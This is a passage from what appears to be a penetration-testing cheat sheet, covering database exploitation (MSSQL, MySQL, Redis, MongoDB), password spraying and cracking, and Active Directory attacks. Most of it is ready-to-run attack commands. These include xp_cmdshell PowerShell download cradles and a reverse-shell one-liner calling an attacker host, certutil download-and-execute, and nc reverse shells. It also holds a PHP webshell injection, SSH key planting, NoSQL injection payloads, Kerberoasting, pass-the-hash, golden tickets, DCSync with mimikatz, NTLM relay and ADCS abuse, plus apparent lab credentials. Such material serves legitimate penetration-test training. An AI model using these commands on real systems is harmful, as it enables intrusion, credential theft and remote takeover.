+sqlcmd -S &lt;IP&gt; -E
+
+# Check if sysadmin
+SELECT IS_SRVROLEMEMBER(&#x27;sysadmin&#x27;);
+GO
+
+# Enumerate Databases
+SELECT name FROM master.sys.databases;
+GO
+
+# Enable xp_cmdshell
+EXEC sp_configure &#x27;show advanced options&#x27;, 1;
+RECONFIGURE;
+EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;
+RECONFIGURE;
+GO
+
+# Execute commands with xp_cmdshell
+EXEC xp_cmdshell &#x27;whoami&#x27;;
+GO
+
+# Linked Servers
+EXEC sp_linkedservers;
+GO
+SELECT * FROM OPENQUERY(&quot;MS02\SQLEXPRESS&quot;, &#x27;SELECT @@version, SYSTEM_USER&#x27;);
+GO
+
+# Execute via SQL
+EXEC xp_cmdshell &#x27;powershell -c &quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;&#x27;http://&lt;LHOST&gt;:&lt;PORT&gt;/rev.ps1&#x27;&#x27;)&quot;&#x27;;
+GO
+
+# one line
+EXEC xp_cmdshell &#x27;powershell -NoP -NonI -W Hidden -Exec Bypass -Command &quot;$client = New-Object System.Net.Sockets.TCPClient(&#x27;&#x27;&lt;LHOST&gt;&#x27;&#x27;,&lt;LPORT&gt;);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#x27;&#x27;PS &#x27;&#x27; + (pwd).Path + &#x27;&#x27;&gt; &#x27;&#x27;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;&#x27;;
+GO
+
+# -- Download and execute EXE
+EXEC xp_cmdshell &#x27;certutil -urlcache -f http://&lt;LHOST&gt;:&lt;PORT&gt;/reverse.exe C:\Windows\Temp\reverse.exe &amp;&amp; C:\Windows\Temp\reverse.exe&#x27;;
+
+EXEC xp_cmdshell &#x27;powershell -ExecutionPolicy Bypass -Command &quot;Invoke-WebRequest -Uri http://10.10.180.147:4444/GodPotato-NET4.exe -OutFile C:\Windows\Temp\GodPotato-NET4.exe&quot;&#x27;;
+
+-- Download GodPotato
+EXEC xp_cmdshell &#x27;certutil -urlcache -f https://github.com/BeichenDream/GodPotato/releases/download/1.0/GodPotato.exe C:\Windows\Temp\GodPotato.exe&#x27;;
+
+-- Execute with specific command
+EXEC xp_cmdshell &#x27;C:\Windows\Temp\GodPotato.exe -cmd &quot;cmd /c whoami&quot;&#x27;;
+
+-- Execute with reverse shell
+EXEC xp_cmdshell &#x27;C:\Windows\Temp\GodPotato.exe -cmd &quot;C:\Windows\Temp\nc.exe -e cmd &lt;LHOST&gt; &lt;LPORT&gt;&quot;&#x27;;
+
+-- Or with PowerShell
+EXEC xp_cmdshell &#x27;C:\Windows\Temp\GodPotato.exe -cmd &quot;powershell -c IEX(New-Object Net.WebClient).DownloadString(&#x27;&#x27;http://&lt;LHOST&gt;:&lt;PORT&gt;/rev.ps1&#x27;&#x27;)&quot;&#x27;;
+
+</code></pre></div><div style="display:contents" dir="auto"><p id="386a083f-29df-80ad-879c-d1cbf9da4b21" class="">
+</p></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-8003-8d1e-d038aa8c6d7b" class="">MySQL</h3></div><div style="display:contents" dir="auto"><p id="385a083f-29df-8008-aeb4-fd2e82b9066e" class=""><a href="https://hacktricks.wiki/en/pentesting-web/sql-injection/mysql-injection/index.html">https://hacktricks.wiki/en/pentesting-web/sql-injection/mysql-injection/index.html</a></p></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-8083-8c11-cc68d8c9891c" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">mysql -u root -p -h &lt;IP&gt; --skip-ssl
+mysql&gt; show databases;
+mysql&gt; use &lt;DATABASE&gt;;
+mysql&gt; show tables;
+mysql&gt; SELECT * FROM users;
+mysql&gt; SELECT &quot;KEY&quot; INTO OUTFILE &#x27;/root/.ssh/authorized_keys2&#x27;;
+mysql&gt; \! /bin/sh
+
+mysql -u root -p&#x27;root&#x27; -h 192.168.50.16 -P 3306 --skip-ssl-verify-server-cert
+
+&#x27; UNION SELECT &quot;&lt;?php system($_GET[&#x27;cmd&#x27;]);?&gt;&quot;, null, null, null, null INTO OUTFILE &quot;/var/www/html/tmp/webshell.php&quot; -- //
+
+# From Target 1 pivot or direct if accessible
+mysql -h 192.168.150.96 -u root -p
+# Try default passwords or credentials found from LSASS dump
+
+# Dump all databases
+mysqldump -h 192.168.150.96 -u [username] -p --all-databases &gt; dump.sql
+
+# Look for credentials in the dump
+cat dump.sql | grep -i &quot;password\\|passwd\\|cred\\|user&quot;
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-8077-be6b-de99f0ee1a1c" class="">PostgreSQL</h3></div><div style="display:contents" dir="auto"><p id="385a083f-29df-8027-91a7-df0ba76f10be" class=""><a href="https://hacktricks.wiki/en/network-services-pentesting/pentesting-postgresql.html">https://hacktricks.wiki/en/network-services-pentesting/pentesting-postgresql.html</a></p></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-807b-bf19-c6f4c055f4db" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">psql -h &lt;IP&gt; -p 5432 -U &lt;USERNAME&gt; -d &lt;DATABASE&gt;
+postgres=# \list
+postgres=# \c &lt;DATABASE&gt;
+postgres=# \dt
+postgres=# SELECT usename, passwd from pg_shadow;</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-80f2-95ee-f6fa64e8816e" class="">Redis</h3></div><div style="display:contents" dir="auto"><p id="385a083f-29df-800b-82d4-d5e246827e97" class=""><a href="https://hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html">https://hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html</a></p></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-808e-8f0f-c28895a3bdc8" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">redis-cli -h &lt;IP&gt;
+&gt; AUTH &lt;PASSWORD&gt;
+&gt; INFO keyspace
+&gt; KEYS *
+&gt; GET PHPREDIS_SESSION:2a9mbvnjgd6i2qeqcubgdv8n4b
+
+# Redis SSH key injection
+(echo -e &quot;\n\n&quot;; cat ~/.ssh/id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; /tmp/key.txt
+cat /tmp/key.txt | redis-cli -h &lt;IP&gt; -x set s-key
+redis-cli -h &lt;IP&gt;
+&gt; CONFIG SET dir /var/lib/redis/.ssh
+&gt; CONFIG SET dbfilename authorized_keys
+&gt; save</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-8057-8b21-ffc1e87dfab4" class="">SQLite</h3></div><div style="display:contents" dir="auto"><p id="385a083f-29df-80dd-b950-c7ee0b892c79" class=""><a href="https://github.com/nixawk/pentest-wiki/blob/master/2.Vulnerability-Assessment/Database-Assessment/sqlite/sqlite_hacking.md">https://github.com/nixawk/pentest-wiki/blob/master/2.Vulnerability-Assessment/Database-Assessment/sqlite/sqlite_hacking.md</a></p></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-80e9-914a-edf66db8f203" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">sqlite3 &lt;FILE&gt;.db
+sqlite&gt; .tables
+sqlite&gt; PRAGMA table_info(&lt;TABLE&gt;);
+sqlite&gt; SELECT * FROM &lt;TABLE&gt;;
+
+file db
+sqlite3 db
+.tables
+SELECT * FROM users;  # or equivalent table name
+.quit
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-803b-916f-ff0e3eae9df2" class="">MongoDB</h3></div><div style="display:contents" dir="auto"><p id="385a083f-29df-80c7-b61f-d358aabd8b49" class=""><a href="https://hacktricks.wiki/en/network-services-pentesting/27017-27018-mongodb.html">https://hacktricks.wiki/en/network-services-pentesting/27017-27018-mongodb.html</a></p></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-80b7-8e04-d1b6c87e00f4" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">mongo &quot;mongodb://localhost:27017&quot;
+&gt; use &lt;DATABASE&gt;;
+&gt; show collections;
+&gt; db.users.find();
+&gt; db.getUsers({showCredentials: true});</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-8054-b07b-c2792a6c1983" class="">NoSQL Injection</h3></div><div style="display:contents" dir="auto"><p id="385a083f-29df-80d1-8c92-d06f82441a8a" class=""><a href="https://hacktricks.wiki/en/pentesting-web/nosql-injection.html">https://hacktricks.wiki/en/pentesting-web/nosql-injection.html</a></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-jsx.min.js" integrity="sha512-m3JYEI6gx5fh9jF10FjGoMzVKcV2N6nchcDcqPCdI1L3R2WQV7br2XVNR8iTLb2daOMRl3zldbcfT40xU2ntVw==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><pre id="384a083f-29df-8091-9cb4-e7a886ca2757" class="code code-wrap"><code class="language-jsx" style="white-space:pre-wrap;word-break:break-all">// MongoDB
+username[$ne]=RandomNoexiste&amp;password[$ne]=noexiste
+username[$regex]=^.{4}&amp;password=noexist
+
+// Node.js JSON payload
+{
+  &quot;username&quot;: { &quot;$ne&quot;: &quot;RandomNOExiste&quot;},
+  &quot;password&quot;: { &quot;$ne&quot;: &quot;ipssec&quot;}
+}</code></pre></div><div style="display:contents" dir="auto"><hr id="384a083f-29df-8021-bd20-d7a5f84b2d94"/></div><div style="display:contents" dir="auto"><h2 id="384a083f-29df-8019-b0ad-e9cf5f2cad6c" class="">🔑 Password Attacks &amp; Cracking</h2></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-806f-9863-cf9f802cd1e9" class="">Password Spraying</h3></div><div style="display:contents" dir="auto"><p id="385a083f-29df-8006-93b8-d2be33833db5" class=""><a href="https://www.netexec.wiki/smb-protocol/password-spraying">https://www.netexec.wiki/smb-protocol/password-spraying</a></p></div><div style="display:contents" dir="auto"><p id="385a083f-29df-80a4-9940-e32e21e5169f" class=""><a href="https://github.com/seriotonctf/cme-nxc-cheat-sheet">https://github.com/seriotonctf/cme-nxc-cheat-sheet</a></p></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-8046-b728-c1ea3094c3ac" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># CrackMapExec
+nxc smb &lt;IP&gt; -u users.txt -p passwords.txt --continue-on-success
+nxc winrm &lt;IP&gt; -u users.txt -p passwords.txt
+nxc smb &lt;SUBNET&gt;/24 -u user -p pass --continue-on-success
+
+nxc smb &lt;IP&gt; -u user.txt -p password.txt --no-bruteforce --continue-on-success
+
+# Hydra
+hydra -L users.txt -P pass.txt ssh://&lt;IP&gt; -t 4
+hydra -l admin -P rockyou.txt &lt;IP&gt; http-post-form &quot;/login:username=^USER^&amp;password=^PASS^:F=Invalid&quot;
+hydra -L users.txt -P pass.txt rdp://&lt;IP&gt;
+
+
+# Kerbrute
+kerbrute passwordspray -d DOMAIN --dc &lt;DC_IP&gt; users.txt &#x27;Password123!&#x27;
+kerbrute userenum --dc &lt;DC_IP&gt; -d DOMAIN usernames.txt
+sudo kerbrute passwordspray -d DOMAIN.local --dc &lt;DC_IP&gt; user.txt  Welcome1
+
+/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+/usr/share/seclists/Usernames/Names/names.txt
+/usr/share/wordlists/metasploit/unix_users.txt
+/usr/share/wordlists/seclists/Usernames/Names/
+/usr/share/wordlists/metasploit/</code></pre></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-80c0-9b21-c3699dfafc38" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># Hashcat
+hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 13100 tgs.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+hashcat -m 18200 asrep.txt rockyou.txt
+hashcat -m 5600 netntlm.txt rockyou.txt
+hashcat -O -m 500 -a 3 -1 ?l -2 ?d -3 ?u --force hash.txt ?3?3?1?1?1?1?2?3
+
+/usr/share/john/password.lst
+
+# Identify hash type
+hashid &lt;HASH&gt;
+hash-identifier</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-80bb-b9ee-c478e3287adc" class="">John the Ripper / 2John</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-80ec-9c6b-f45d7944d49e" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+john --format=nt hash.txt --wordlist=rockyou.txt
+unshadow passwd shadow | john - --wordlist=rockyou.txt
+
+# SSH private key
+ssh2john id_rsa &gt; ssh.hash
+john ssh.hash --wordlist=rockyou.txt
+
+# ZIP
+zip2john file.zip &gt; hash
+john hash --wordlist=rockyou.txt
+
+# 7z
+7z2john backup.7z &gt; backup.hash
+
+# doc
+office2john
+
+# gpg
+gpg2john private.key &gt; private.hash
+john --format=gpg private.hash --wordlist=/usr/share/wordlists/rockyou.txt
+
+# pfx
+pfx2john legacyy_dev_auth.pfx &gt; pfx.john
+
+# pdf
+pdf2john file.pdf &gt; pdf.hash
+
+# pem
+pem2john baker.key &gt; baker.hash
+
+# ansible
+ansible2john vault1
+
+# keypass /kdbx
+keepass2john jeeves.kdbx &gt; jeeves.hash
+
+# rar
+rar2john keys.rar &gt; keys.hash
+
+# zip
+fcrackzip -u    -D -p rockyou.txt  backup.zip
+fcrackzip -v -u -D -p rockyou.txt backup.zip
+
+# KeePass
+keepass2john database.kdbx &gt; hash
+john hash --wordlist=rockyou.txt --format=KeePass
+
+bitlocker2john
+
+dmg2john
+
+hccap2john
+
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-8090-9802-f74a327a3c93" class="">Wordlist Generation</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-8066-ac3a-efe8e60b5e7b" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># Crunch
+crunch 6 6 0123456789ABCDEF -o list.txt
+crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha -o mixedalpha.txt
+
+# CEWL
+cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt
+john --wordlist=megacorp-cewl.txt --rules --stdout &gt; mutated.txt
+
+# cewl -d &lt;depth to spider&gt; -m &lt;minimum word length&gt; -w &lt;output wordlist&gt; &lt;url of website&gt;
+
+cewl http://&lt;IP&gt; -d 4 -m 6 --lowercase -w passwords.txt
+
+cewl http://&lt;IP&gt;/blog -d 5 -m 8 -e  -w passwords.txt
+
+cewl http://&lt;IP&gt; | tr &#x27;[:upper:]&#x27; &#x27;[:lower:]&#x27; &gt; vault.txt
+
+cewl http://&lt;IP&gt; &gt; wordlist.txt
+
+cewl http://&lt;IP&gt; -e -a  -w passwords.txt
+
+cewl http://&lt;IP&gt; --lowercase  &gt; passwords.txt
+
+cewl http://&lt;IP&gt; --depth 2 --with-numbers -w passwords.txt 
+
+cewl http://&lt;IP&gt; -w passwords.txt
+
+cewl http://&lt;IP&gt;/joomla -d 4 -w passwords.txt
+
+cewl http://&lt;IP&gt;/?q=node/1 -w passwords.txt
+
+
+
+
+
+# Hashcat rule
+hashcat -a3 -m0 mantas?d?d?d?u?u?u --force --potfile-disable --stdout</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-8064-a6f3-eca7bceb9315" class="">NetExec (nxc) - All Protocols</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-80ea-bab7-f6d380419cf4" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># Available protocols: smb, ldap, ftp, vnc, rdp, nfs, ssh, mssql, winrm, wmi
+
+nxc smb &lt;IP&gt; -u user -p pass --shares --users --groups 
+
+--computers --interfaces --disks --pass-pol --smb-sessions --loggedon-users --tasklist
+
+nxc smb &lt;IP&gt; -u user -H &lt;NTLM_HASH&gt; --local-auth
+nxc smb &lt;IP&gt; -u user -p pass --sam --lsa --dpapi --laps
+nxc smb &lt;IP&gt; -u user -p pass -M lsassy
+nxc smb &lt;IP&gt; -u user -p pass -M gpp_password
+nxc smb &lt;IP&gt; -u user -p pass --ntds
+
+# allextendedright
+nxc ldap &lt;IP&gt; -d &quot;ignite.local&quot; -u user -p pass --module laps
+
+nxc winrm &lt;ip&gt; -u user -p pass --laps
+
+nxc ldap &lt;IP&gt; -u user -p pass --users --groups 
+
+--computers --dc-list --find-delegation --trusted-for-delegation --admin-count --pass-pol
+
+nxc ldap &lt;IP&gt; -u user -p pass --bloodhound --collection All --dns-server &lt;DNS_IP&gt;
+
+nxc ldap &lt;IP&gt; -u user -p pass --gmsa
+
+nxc winrm &lt;IP&gt; -u user -p pass --dir
+nxc wmi &lt;IP&gt; -u user -p pass --wmi-query --wmi-namespace
+nxc mssql &lt;IP&gt; -u sa -p pass --local-auth --rid-brute
+nxc ftp &lt;IP&gt;
+nxc vnc &lt;IP&gt;
+nxc nfs &lt;IP&gt; --enum-shares 3
+nxc ssh &lt;IP&gt;
+nxc rdp &lt;IP&gt; --screenshot</code></pre></div><div style="display:contents" dir="auto"><hr id="384a083f-29df-806c-8c86-e0c314c802b1"/></div><div style="display:contents" dir="auto"><h2 id="384a083f-29df-80a6-b0a6-d4cee4a59ec4" class="">🏢 Active Directory Attacks</h2></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-804a-8c29-d0a1f445659d" class="">Kerberos Attacks</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-80a2-a21e-d241f950d0e9" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">https://github.com/61106960/adPEAS.git
+
+wget https://github.com/61106960/adPEAS/raw/refs/heads/main/adPEAS.ps1
+
+Import-Module .\adPEAS.ps1
+
+. .\adPEAS.ps1
+
+
+
+# AS-REP Roasting (no pre-auth accounts)
+impacket-GetNPUsers domain.htb/ -no-pass -usersfile users.txt -request -format hashcat -outputfile asrep.txt
+nxc ldap &lt;DC_IP&gt; -u user -p pass --asreproast asrep.txt
+hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
+
+# Kerberoasting (need valid creds)
+impacket-GetUserSPNs domain.htb/user:pass -dc-ip &lt;DC_IP&gt; -request
+nxc ldap &lt;DC_IP&gt; -u user -p pass --kerberoasting kerb.txt
+hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
+
+# Get TGT
+impacket-getTGT domain.htb/user:pass -dc-ip &lt;DC_IP&gt;
+
+nexc smb ip -u user -p password --generate-tgt user
+nxc smb ip -u user -k --use-kcache
+
+export KRB5CCNAME=user.ccache
+
+# Get ST (Service Ticket)
+impacket-getST -spn cifs/target.domain -impersonate Administrator domain.htb/user:pass
+
+
+# First download targetedKerberoast if needed
+git clone https://github.com/ShutdownRepo/targetedKerberoast.git
+cd targetedKerberoast
+
+# Run the attack
+python3 targetedKerberoast.py -v -d &#x27;laser.com&#x27; -u &#x27;yulia.weber&#x27; -p &#x27;Yulia@Laser777&#x27;
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-80a6-84d8-e7c806187221" class="">Pass-the-Hash (PtH)</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-8007-bd92-f06ede80fe87" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">evil-winrm -i &lt;IP&gt; -u administrator -H &lt;NTLM_hash&gt;
+impacket-psexec -hashes :&lt;NTLM_hash&gt; domain/administrator@&lt;IP&gt;
+impacket-wmiexec -hashes :&lt;NTLM_hash&gt; domain/administrator@&lt;IP&gt;
+nxc smb &lt;IP&gt; -u administrator -H &lt;hash&gt; -x &#x27;whoami&#x27;
+
+smbexec
+psexec.py yoshi:&#x27;Mushroom!&#x27;@172.16.247.82
+impacket-wmiexec o.foller:EarlyMorningFootball777@192.168.220.160 -dc-ip 192.168.220.158</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-80f3-93fc-e39a34336f61" class="">Pass-the-Ticket (PtT)</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-8012-af81-e406d6d3ca22" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># Linux
+export KRB5CCNAME=/tmp/ticket.ccache
+impacket-psexec -k -no-pass domain/administrator@&lt;IP&gt;
+
+# Windows (Rubeus)
+.\Rubeus.exe triage
+.\Rubeus.exe dump /luid:&lt;LUID&gt; /service:krbtgt /nowrap
+.\Rubeus.exe ptt /ticket:&lt;BASE64_TICKET&gt;
+dir \\&lt;TARGET_FQDN&gt;\C$</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-80c7-a77a-e9c11b01250f" class="">Overpass-the-Hash</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-80da-8f1a-d3a9d1356323" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># Windows (Rubeus)
+.\Rubeus.exe asktgt /user:user /rc4:&lt;NTLM_HASH&gt; /domain:domain.htb /ptt
+
+# Linux
+impacket-getTGT domain.htb/user -hashes :&lt;NTLM_HASH&gt; -dc-ip &lt;DC_IP&gt;
+export KRB5CCNAME=user.ccache
+impacket-psexec -k -no-pass domain.htb/user@&lt;TARGET_FQDN&gt;</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-80ec-8247-fededfa1e06b" class="">Golden Ticket</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-80b9-8b27-dea15bc18258" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># Get krbtgt hash
+impacket-secretsdump domain.htb/administrator@&lt;DC_IP&gt; -hashes :&lt;hash&gt;
+
+impacket-secretsdump Eric.Wallows:EricLikesRunning800@192.168.220.159
+
+
+nltest /domain_trusts /v
+
+
+# Create ticket
+impacket-ticketer -nthash &lt;krbtgt_NTLM&gt; -domain-sid &lt;SID&gt; -domain domain.htb administrator
+
+impacket-ticketer -nthash 80f23a248d39b8cb93df3a4a2f4199a1 \\
+  -domain sub.poseidon.yzx \\
+  -domain-sid S-1-5-21-4168247447-1722543658-2110108262 \\
+  -extra-sid S-1-5-21-1190331060-1711709193-932631991 \\
+  Administrator
+
+export KRB5CCNAME=administrator.ccache
+
+impacket-psexec -k -no-pass domain/administrator@&lt;DC&gt;
+
+impacket-psexec sub.poseidon.yzx/Administrator@DC01.poseidon.yzx -k -no-pass
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-801c-b349-cb522c7cb059" class="">Silver Ticket</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-80ec-a472-cb9be4fe27c0" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">impacket-ticketer -nthash &lt;service_NTLM&gt; -domain-sid &lt;SID&gt; -domain domain.htb -spn &lt;service&gt;/&lt;hostname&gt; administrator
+export KRB5CCNAME=administrator.ccache
+impacket-psexec -k -no-pass domain/administrator@&lt;IP&gt;</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-80f8-80b3-e135a2aa944b" class="">DCSync Attack</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-8048-bf48-d6b3f8013472" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">impacket-secretsdump -just-dc domain.htb/administrator@&lt;DC_IP&gt; -hashes :&lt;hash&gt;
+
+
+cp -r /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
+
+# Mimikatz
+
+privilege::debug
+log
+log customlogfilename.log
+sekurlsa::minidump lsass.dmp
+sekurlsa::logonpasswords
+
+.\Mimikatz.exe &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;sekurlsa::logonpasswords&quot; exit
+
+lsadump::dcsync /user:krbtgt /domain:domain.htb
+
+lsadump::dcsync /all /domain:domain.htb
+
+privilege::debug
+misc::memssp
+type C:\\Windows\\System32\\mimilsa.log</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-8028-b1e7-c7c3902b7e54" class="">RBCD (Resource-Based Constrained Delegation)</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-80e2-b442-e1f092fa413f" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># Add computer account
+impacket-addcomputer -method LDAPS -computer-name &#x27;EVIL$&#x27; -computer-pass &#x27;Pass123&#x27; domain.htb/user:pass
+
+# Set RBCD
+impacket-rbcd -delegate-from &#x27;EVIL$&#x27; -delegate-to &#x27;DC$&#x27; -action write domain.htb/user:pass
+
+# Get ST
+impacket-getST -spn &#x27;cifs/DC.domain.htb&#x27; -impersonate Administrator domain.htb/EVIL$:&#x27;Pass123&#x27;</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-80fe-842c-c863503d9325" class="">LLMNR Poisoning</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-80d7-8ea5-cae47976a1ce" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">sudo responder -I tun0 -dwv
+# Crack NTLMv2
+hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-802e-b4b8-e5b574b0142e" class="">SMB Relay</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-8027-8c55-e09ebf51fdd7" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># 1. Check SMB signing is disabled
+nxc smb &lt;IP&gt; --gen-relay-list targets.txt
+
+# 2. Edit /etc/responder/Responder.conf: SMB=Off, HTTP=Off
+sudo responder -I tun0 -dwv &amp;
+
+# 3. Relay
+sudo ntlmrelayx.py -tf targets.txt -smb2support -i
+# Connect: nc 127.0.0.1 11000
+
+# Execute command
+ntlmrelayx.py -tf targets.txt -smb2support -c &quot;whoami&quot;
+
+# NTLM Relay
+impacket-ntlmrelayx --no-http-server -smb2support -t $target -c &quot;powershell -enc $revshell&quot;
+</code></pre></div><div style="display:contents" dir="auto"><h2 id="386a083f-29df-8083-a3c0-d2d9986bb477" class="">NTLM relay</h2></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-8012-95a7-c31036d9544e" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">nxc smb 192.168.121.172-174 -u &#x27;Eric.Wallows&#x27; -p &#x27;EricLikesRunning800&#x27; --gen-relay-list smb_targets.txt
+
+malicious LNK file
+
+nxc smb 192.168.121.173 -u &#x27;Eric.Wallows&#x27; -p &#x27;EricLikesRunning800&#x27; -M slinky -o SERVER=YOUR_KALI_IP NAME=README
+
+
+impacket-ntlmrelayx --no-http-server -smb2support -tf smb_targets.txt
+
+
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-8005-b629-e787c3091493" class="">ADCS (Certificate Abuse)</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-8050-a792-e4d460fc0089" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># Enumerate vulnerable templates
+certipy find -u user@domain.htb -p &#x27;pass&#x27; -dc-ip &lt;DC_IP&gt; -vulnerable -stdout
+certipy find -u user@domain.htb -p &#x27;pass&#x27; -dc-ip &lt;DC_IP&gt; -bloodhound
+
+# ESC1 - Request certificate as Administrator
+certipy req -u user@domain.htb -p &#x27;pass&#x27; -ca &lt;CA_NAME&gt; -template &lt;TEMPLATE&gt; -upn administrator@domain.htb
+certipy auth -pfx administrator.pfx -dc-ip &lt;DC_IP&gt;
+
+# ESC8 - NTLM Relay to ADCS
+certipy relay -target http://&lt;ADCS_IP&gt;/certsrv/certfnsh.asp -template DomainController
+python3 PetitPotam.py -u user -p &#x27;pass&#x27; &lt;LHOST&gt; &lt;DC_IP&gt;
+
+# ESC4 - Write access to template
+certipy template -u user@domain.htb -p &#x27;pass&#x27; -template VulnTemplate -save-old
+certipy template -u user@domain.htb -p &#x27;pass&#x27; -template VulnTemplate -configuration VulnTemplate.json</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-8072-bcd2-c808b8f46fc5" class="">Shadow Credentials Attack</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-80d4-bfab-cff168c28b88" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">pywhisker.py -d domain.htb -u user -p &#x27;pass&#x27; --target targetuser --action add --dc-ip &lt;DC_IP&gt;
+
+certipy auth -pfx targetuser.pfx -dc-ip &lt;DC_IP&gt;
+
+certipy-ad shadow auto -account &quot;MSA_HEALTH$&quot; -k -dc-ip 10.xxxxx -dc-host DC01.Logging.htb</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-8012-a8b2-c3aca4b05f82" class="">BloodHound</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-8013-bda8-dc94f5879291" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># Collection (Python)
+bloodhound-python -d domain.htb -u user -p &#x27;pass&#x27; -c All --zip -ns &lt;DC_IP&gt;
+
+nxc ldap &lt;DC_IP&gt; -u user -p pass --bloodhound -c All --dns-server &lt;DC_IP&gt;
+
+bloodyad -d checkpoint.htb --host dc01.checkpoint.htb -u alex.turner -p Checkpoint2024! get bloodhound
+
+rusthound-ce -u user -p pass -d checkpoint.htb -i &lt;DC_IP&gt; --ldaps --zip
+
+# Windows (SharpHound)
+.\SharpHound.exe -c All
+
+# Start services
